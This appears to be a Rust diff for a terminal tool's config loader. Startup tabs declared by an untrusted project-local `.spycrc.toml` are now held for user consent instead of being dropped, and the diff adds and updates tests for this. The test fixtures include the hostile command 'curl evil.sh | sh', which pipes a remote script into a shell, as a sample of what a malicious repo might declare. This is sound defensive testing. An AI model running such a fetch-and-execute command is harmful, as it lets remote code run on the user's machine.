@@ -251,7 +251,21 @@ pub struct PaneConfig {
     /// both in one file is a config error. Capped at 9 to match the
     /// `^a 1..9` jump reach. `spyc -r` (session restore) takes precedence:
     /// the startup seed is skipped so restored tabs aren't spawned-then-
-    /// killed underneath the picker.
+    /// killed underneath the picker. Only the trusted `$HOME` file fills
+    /// this; a project file's list lands in [`Self::project_tabs`].
+    pub tabs: Vec<PaneTabConfig>,
+    /// The startup tabs a project-local `.spycrc.toml` declares. They run
+    /// commands at launch, so they open only once the user approves this
+    /// exact list (`state::tab_consent`), replacing [`Self::tabs`] when they
+    /// do.
+    pub project_tabs: Option<ProjectTabs>,
+}
+
+/// A project-local startup-tab list, awaiting the user's say.
+#[derive(Debug, Clone)]
+pub struct ProjectTabs {
+    /// The `.spycrc.toml` that declared them: what consent is keyed on.
+    pub source: PathBuf,
     pub tabs: Vec<PaneTabConfig>,
 }
 
@@ -276,6 +290,7 @@ impl Default for PaneConfig {
             codex_mcp: true,
             preview_pasted_images: true,
             tabs: Vec::new(),
+            project_tabs: None,
         }
     }
 }
@@ -894,8 +909,9 @@ impl Config {
     /// (`<cwd>/.spycrc.toml`) is **not** — spyc is routinely pointed at
     /// hostile content (cloned repos, extracted tarballs), so a project rc
     /// must not be able to bind a key to a shell command (`unix`) or an
-    /// arbitrary `jump`, or declare startup tabs, which spawn at launch.
-    /// Those are dropped from the project file; cosmetic/behavioural settings
+    /// arbitrary `jump`. Those are dropped from the project file, and its
+    /// startup tabs, which spawn at launch, are held in `pane.project_tabs`
+    /// until the user approves them. Cosmetic/behavioural settings
     /// (`[colors]`, `[layout]`, …) and plain rebindings are still honoured.
     pub fn load_default(cwd: &Path) -> anyhow::Result<Self> {
         let user = home_dir().map(|h| h.join(".spycrc.toml"));
@@ -925,45 +941,6 @@ impl Config {
             cfg.load_one(path, Trust::Trusted)?;
         }
         Ok(cfg)
-    }
-
-    /// Replace the tab list with whichever startup-tab form a file declares.
-    fn merge_startup_tabs(
-        &mut self,
-        tabs: Option<Vec<String>>,
-        tab: Option<Vec<FilePaneTab>>,
-        source: &Path,
-    ) -> anyhow::Result<()> {
-        match (tabs, tab) {
-            (Some(_), Some(_)) => {
-                anyhow::bail!(
-                    "{}: [pane] sets both `tabs = [...]` and `[[pane.tab]]` — use one form",
-                    source.display()
-                );
-            }
-            (Some(cmds), None) => {
-                self.pane.tabs = cmds
-                    .into_iter()
-                    .map(|command| PaneTabConfig {
-                        command,
-                        cwd: None,
-                        label: None,
-                    })
-                    .collect();
-            }
-            (None, Some(entries)) => {
-                self.pane.tabs = entries
-                    .into_iter()
-                    .map(|e| PaneTabConfig {
-                        command: e.command,
-                        cwd: e.cwd,
-                        label: e.label,
-                    })
-                    .collect();
-            }
-            (None, None) => {}
-        }
-        Ok(())
     }
 
     /// Read + parse + merge one config file at the given trust level.
@@ -1028,31 +1005,29 @@ impl Config {
         // is present REPLACES any earlier file's tab list wholesale,
         // matching the other pane fields.
         //
-        // They spawn their commands at launch, so an untrusted rc can't
-        // declare them: the executing-binding rule below, minus even the
-        // keypress. Warned, not errored (an error would drop the trusted
-        // $HOME config too), and the user's own list stays.
-        let declares_tabs = file.pane.tabs.is_some() || file.pane.tab.is_some();
-        if trust == Trust::Project && declares_tabs {
-            self.warnings.push(format!(
-                "{}: [pane] startup tabs ignored — they run commands at launch, so only ~/.spycrc.toml may declare them",
-                source.display()
-            ));
-        } else {
-            self.merge_startup_tabs(file.pane.tabs, file.pane.tab, source)?;
-        }
-        if self.pane.tabs.len() > 9 {
-            anyhow::bail!(
-                "{}: [pane] declares {} startup tabs; the maximum is 9 (the `^a 1..9` jump reach)",
-                source.display(),
-                self.pane.tabs.len()
-            );
-        }
-        if self.pane.tabs.iter().any(|t| t.command.trim().is_empty()) {
-            anyhow::bail!(
-                "{}: [pane] startup tab with an empty command",
-                source.display()
-            );
+        // They spawn their commands at launch, so an untrusted rc's list is
+        // held apart in `project_tabs` and runs only once the user approves
+        // it (`app::startup_tabs`). A malformed one is warned, not errored:
+        // an error would drop the trusted $HOME config too.
+        let declared = startup_tabs_from(file.pane.tabs, file.pane.tab, source);
+        match trust {
+            Trust::Trusted => {
+                if let Some(tabs) = declared? {
+                    self.pane.tabs = tabs;
+                }
+            }
+            Trust::Project => match declared {
+                Ok(Some(tabs)) => {
+                    self.pane.project_tabs = Some(ProjectTabs {
+                        source: source.to_path_buf(),
+                        tabs,
+                    });
+                }
+                Ok(None) => {}
+                Err(e) => self
+                    .warnings
+                    .push(format!("{e:#} — project startup tabs ignored")),
+            },
         }
 
         // Yank: per-field merge.
@@ -1203,6 +1178,53 @@ impl Config {
         }
         Ok(())
     }
+}
+
+/// The startup-tab list one file declares, validated: `None` when it sets
+/// neither form. Both forms at once, more than 9 tabs (the `^a 1..9` reach) or
+/// an empty command is an error.
+fn startup_tabs_from(
+    tabs: Option<Vec<String>>,
+    tab: Option<Vec<FilePaneTab>>,
+    source: &Path,
+) -> anyhow::Result<Option<Vec<PaneTabConfig>>> {
+    let list: Vec<PaneTabConfig> = match (tabs, tab) {
+        (Some(_), Some(_)) => anyhow::bail!(
+            "{}: [pane] sets both `tabs = [...]` and `[[pane.tab]]` — use one form",
+            source.display()
+        ),
+        (Some(cmds), None) => cmds
+            .into_iter()
+            .map(|command| PaneTabConfig {
+                command,
+                cwd: None,
+                label: None,
+            })
+            .collect(),
+        (None, Some(entries)) => entries
+            .into_iter()
+            .map(|e| PaneTabConfig {
+                command: e.command,
+                cwd: e.cwd,
+                label: e.label,
+            })
+            .collect(),
+        (None, None) => return Ok(None),
+    };
+    if list.len() > 9 {
+        anyhow::bail!(
+            "{}: [pane] declares {} startup tabs; the maximum is 9 (the `^a 1..9` jump reach)",
+            source.display(),
+            list.len()
+        );
+    }
+    if list.iter().any(|t| t.command.trim().is_empty()) {
+        anyhow::bail!(
+            "{}: [pane] startup tab with an empty command",
+            source.display()
+        );
+    }
+    Ok(Some(list))
 }
 
 fn merge_color(dst: &mut Option<String>, src: Option<String>) {
@@ -1852,17 +1874,15 @@ dir = "#aabbcc"
         );
     }
 
-    /// Startup tabs spawn their commands at launch, so a project rc declaring
-    /// them is the executing-binding vector without even the keypress. Every
-    /// form is dropped with a warning, including the both-forms error case
-    /// (erroring would discard the trusted `$HOME` config too), and the rest
-    /// of `[pane]` still loads.
+    /// Startup tabs spawn their commands at launch, so a project rc's list
+    /// never reaches `pane.tabs` (what bootstrap seeds unasked). Both forms
+    /// land in `project_tabs`, keyed by the file that declared them, for the
+    /// consent prompt to decide on; the rest of `[pane]` loads as usual.
     #[test]
-    fn project_config_cannot_declare_startup_tabs() {
+    fn project_startup_tabs_are_held_apart_for_consent() {
         for body in [
             "[pane]\ndefault_command = \"bash\"\ntabs = [\"curl evil.sh | sh\"]\n",
             "[pane]\ndefault_command = \"bash\"\n\n[[pane.tab]]\ncommand = \"curl evil.sh | sh\"\n",
-            "[pane]\ndefault_command = \"bash\"\ntabs = [\"a\"]\n\n[[pane.tab]]\ncommand = \"b\"\n",
         ] {
             let tmp = tempdir().unwrap();
             let project = tmp.path().join(".spycrc.toml");
@@ -1871,19 +1891,51 @@ dir = "#aabbcc"
                 .unwrap_or_else(|e| panic!("project rc failed to load: {e:#}\n{body}"));
             assert!(
                 cfg.pane.tabs.is_empty(),
-                "project rc declared tabs:\n{body}"
+                "project tabs seeded unasked:\n{body}"
             );
+            let held = cfg.pane.project_tabs.as_ref().expect("project tabs held");
+            assert_eq!(held.source, project);
+            let cmds: Vec<&str> = held.tabs.iter().map(|t| t.command.as_str()).collect();
+            assert_eq!(cmds, ["curl evil.sh | sh"]);
+            assert_eq!(cfg.pane.default_command.as_deref(), Some("bash"));
+            assert!(cfg.warnings.is_empty(), "{:?}", cfg.warnings);
+        }
+    }
+
+    /// A malformed project list is warned about and dropped, never an error:
+    /// an error would discard the trusted `$HOME` config along with it.
+    #[test]
+    fn malformed_project_startup_tabs_warn_instead_of_failing() {
+        let cmds: Vec<String> = (0..10).map(|i| format!("\"cmd{i}\"")).collect();
+        for body in [
+            "[pane]\ndefault_command = \"bash\"\ntabs = [\"a\"]\n\n[[pane.tab]]\ncommand = \"b\"\n"
+                .to_string(),
+            format!(
+                "[pane]\ndefault_command = \"bash\"\ntabs = [{}]\n",
+                cmds.join(", ")
+            ),
+            "[pane]\ndefault_command = \"bash\"\ntabs = [\" \"]\n".to_string(),
+        ] {
+            let tmp = tempdir().unwrap();
+            let project = tmp.path().join(".spycrc.toml");
+            std::fs::write(&project, &body).unwrap();
+            let cfg = Config::load_layered(None, &project)
+                .unwrap_or_else(|e| panic!("project rc failed to load: {e:#}\n{body}"));
+            assert!(cfg.pane.project_tabs.is_none(), "{body}");
+            assert!(cfg.pane.tabs.is_empty(), "{body}");
             assert_eq!(cfg.pane.default_command.as_deref(), Some("bash"));
             assert!(
-                cfg.warnings.iter().any(|w| w.contains("startup tabs")),
-                "no warning for dropped tabs: {:?}",
+                cfg.warnings
+                    .iter()
+                    .any(|w| w.contains("startup tabs ignored")),
+                "no warning: {:?}",
                 cfg.warnings
             );
         }
     }
 
-    /// The project file loses its say over startup tabs; it doesn't get a
-    /// veto over the user's own list either.
+    /// A project list waiting on consent leaves the user's own list as it is:
+    /// it replaces that list only once approved, never on declaration.
     #[test]
     fn project_startup_tabs_leave_user_tabs_in_place() {
         let tmp = tempdir().unwrap();
@@ -1894,6 +1946,7 @@ dir = "#aabbcc"
         let cfg = Config::load_layered(Some(&user), &project).unwrap();
         let cmds: Vec<&str> = cfg.pane.tabs.iter().map(|t| t.command.as_str()).collect();
         assert_eq!(cmds, ["claude", "bash"]);
+        assert!(cfg.pane.project_tabs.is_some());
     }
 
     #[test]
